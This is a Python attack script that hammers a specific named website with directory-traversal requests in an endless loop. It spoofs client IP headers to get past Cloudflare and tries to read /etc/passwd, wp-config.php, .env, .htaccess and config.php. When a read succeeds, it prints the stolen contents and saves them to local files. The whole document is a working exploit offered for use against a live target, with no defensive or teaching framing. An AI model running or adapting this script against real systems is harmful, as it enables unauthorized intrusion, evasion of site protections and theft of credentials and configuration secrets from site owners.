#!/usr/bin/env python3
import requests
import random
import time
import sys

def final_test():
    target = "https://pakyok77.link"
    attempt = 0
    
    print("🚀 FINAL INFINITE BYPASS TESTER")
    print("=" * 50)
    print("Target:", target)
    print("Status: Running until success...")
    print("=" * 50)
    
    while True:
        attempt += 1
        
        # Random bypass headers
        headers = {
            'User-Agent': f'Mozilla/5.0 (Final-{random.randint(1,9999)})',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        
        # Test combinations
        files = ['etc/passwd', 'wp-config.php', '.env', '.htaccess', 'config.php']
        params = ['page', 'file', 'include', 'path', 'view']
        endpoints = ['index.php', 'main.php', 'view.php', 'admin.php']
        
        for target_file in files:
            for endpoint in endpoints:
                for param in params:
                    # Generate payload
                    depth = random.randint(2, 8)
                    payload = '../' * depth + target_file
                    
                    try:
                        response = requests.get(
                            f"{target}/{endpoint}",
                            params={param: payload},
                            headers=headers,
                            timeout=3
                        )
                        
                        content = response.text.lower()
                        
                        # Check if bypassed Cloudflare
                        if not any(x in content for x in ['cloudflare', 'blocked', 'forbidden', 'ray id']):
                            # Check for file content
                            success = False
                            
                            if 'passwd' in target_file and any(x in content for x in ['root:', 'bin:', 'daemon:']):
                                success = True
                            elif 'config' in target_file and any(x in content for x in ['db_name', 'db_user', 'wp_']):
                                success = True
                            elif 'env' in target_file and any(x in content for x in ['app_key', 'db_', '=']):
                                success = True
                            elif 'htaccess' in target_file and any(x in content for x in ['rewriteengine', 'options']):
                                success = True
                            
                            if success:
                                print(f"\n🎉🎉🎉 BYPASS SUCCESS! 🎉🎉🎉")
                                print(f"Attempt Number: #{attempt}")
                                print(f"Successfully Downloaded: {target_file}")
                                print(f"URL: {target}/{endpoint}?{param}={payload}")
                                print(f"Response Size: {len(response.text)} bytes")
                                print(f"Status Code: {response.status_code}")
                                print("\n📄 FILE CONTENT:")
                                print("=" * 60)
                                print(response.text)
                                print("=" * 60)
                                
                                # Save to file
                                with open(f"{target_file.replace('/', '_')}_BYPASSED.txt", 'w') as f:
                                    f.write(f"# BYPASS SUCCESS!\n")
                                    f.write(f"# File: {target_file}\n")
                                    f.write(f"# URL: {target}/{endpoint}?{param}={payload}\n")
                                    f.write(f"# Attempt: {attempt}\n")
                                    f.write("=" * 50 + "\n\n")
                                    f.write(response.text)
                                
                                print(f"\n💾 File saved as: {target_file.replace('/', '_')}_BYPASSED.txt")
                                print("\n✅ MISSION ACCOMPLISHED!")
                                return True
                                
                    except Exception:
                        continue
        
        # Progress indicator
        if attempt % 25 == 0:
            print(f"⚡ Attempt #{attempt} - Still testing...")
            sys.stdout.flush()
        
        time.sleep(0.02)

if __name__ == "__main__":
    final_test()